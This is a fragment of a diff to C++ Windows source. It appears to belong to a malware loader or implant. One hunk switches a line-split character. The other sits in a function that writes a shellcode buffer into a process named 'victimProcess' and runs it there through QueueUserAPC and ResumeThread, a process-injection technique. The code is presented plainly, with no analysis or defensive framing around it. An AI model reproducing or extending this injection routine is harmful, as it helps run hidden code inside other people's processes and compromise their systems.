@@ -82,7 +82,7 @@ public:
         istringstream is(res);
         string line;
 
-        char split = '\n';
+        char split = '\r';
         if (res.find("\n") == -1)
         {
             split = '\r';
@@ -169,7 +169,6 @@ DWORD WINAPI run__slcd__(LPVOID lpParameter)
     PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
     WriteProcessMemory(victimProcess, shellAddress, __code, __codeSize, NULL);
     QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
-
     ResumeThread(threadHandle);
     return 0;
 }
